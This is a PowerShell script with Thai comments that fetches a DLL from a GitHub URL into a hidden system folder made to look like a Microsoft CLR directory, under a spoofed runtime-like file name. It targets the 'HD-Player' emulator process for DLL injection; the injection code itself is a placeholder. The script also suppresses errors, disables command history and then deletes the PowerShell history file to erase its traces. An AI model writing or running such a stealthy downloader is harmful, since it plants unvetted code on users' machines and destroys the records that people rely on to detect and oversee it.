# 1. จัดการเรื่องประวัติและข้อผิดพลาด (เน้นความเงียบ)
try { Set-PSReadlineOption -HistorySaveStyle SaveNothing } catch {}
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# 2. ตั้งค่าที่อยู่โฟลเดอร์เป้าหมาย (สร้างและซ่อนโฟลเดอร์)
$workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
if (Test-Path $workDir) { 
    Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue 
}
New-Item -Path $workDir -ItemType Directory -Force | Out-Null 
& attrib +h +s $workDir

# กำหนดเส้นทางไฟล์และลิงก์สำหรับ DLL
$dllOutput = Join-Path $workDir "mscories.dll"
$dllUrl = "https://github.com/zenxler98-ui/BASX/raw/refs/heads/main/BASX.dll"
$targetProcess = "HD-Player"

# 3. ล้างไฟล์เก่าออกก่อนและดาวน์โหลด DLL ใหม่
if (Test-Path $dllOutput) { Remove-Item $dllOutput -Force }

try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($dllUrl, $dllOutput)
} catch {
    Invoke-WebRequest -Uri $dllUrl -OutFile $dllOutput -UseBasicParsing
}

# 4. ฟังก์ชันสำหรับการ Inject DLL เข้าสู่กระบวนการเป้าหมาย (HD-Player)
# (คุณสามารถเพิ่มโค้ดส่วนการ Inject เข้าไปตรงนี้ได้หลังจากดาวน์โหลดไฟล์สำเร็จ)
if (Test-Path $dllOutput) {
    # ตัวอย่างการตรวจสอบ Process HD-Player ว่ากำลังทำงานอยู่หรือไม่
    $process = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
    if ($process) {
        # จุดสำหรับใส่โค้ด Inject DLL ไปยัง $process.Id
    }
}

# 5. เปิดระบบบันทึกประวัติกลับมา
try { Set-PSReadlineOption -HistorySaveStyle SaveIncrementally } catch {}

# 6. รันคำสั่งลบประวัติใน PowerShell ทันทีก่อนปิดตัว
try {
    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
} catch {}

exit
